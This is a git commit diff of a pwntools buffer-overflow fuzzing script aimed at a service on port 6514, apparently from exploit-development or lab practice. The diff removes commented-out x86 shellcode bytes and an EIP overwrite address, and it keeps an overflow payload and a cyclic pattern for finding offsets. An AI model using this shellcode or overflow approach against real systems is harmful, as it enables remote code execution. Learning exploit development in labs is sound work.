afed0a1e6db137a327f80399d0675dc82766d71e
Sigrid <101998818+sigridou@users.noreply.github.com>
2024-05-08 00:41:36 +0100

    Update fuzz.py

--- fuzz.py
+++ fuzz.py
@@ -2,19 +2,15 @@
 
 from pwn import *
 
-host = '192.168.1.132'
+host = '@ip'
 port = 6514
 
 # Define the buffer size
-buffer_size = 39
+buffer_size = 48
 
-# Calculate the necessary padding length
-#padding_length = buffer_size - 23  # Assuming 23 bytes for the shellcode
 
-# Craft the payload
-#eip = b'\x50\x16\x40\x00'  # Little-endian address you provided
-#shellcode = b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x6e\x66\x68\x2d\x68\x89\xe3\x50\x68\x2f\x62\x69\x6e\x68\x2f\x73\x68\x68\x89\xe1\xb0\x0b\x52\x53\x89\xe1\xcd\x80'
 payload =  b'A' * buffer_size
+# payload =  b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5' 
 
 # Print the length of the payload
 print("Payload length:", len(payload), "bytes")
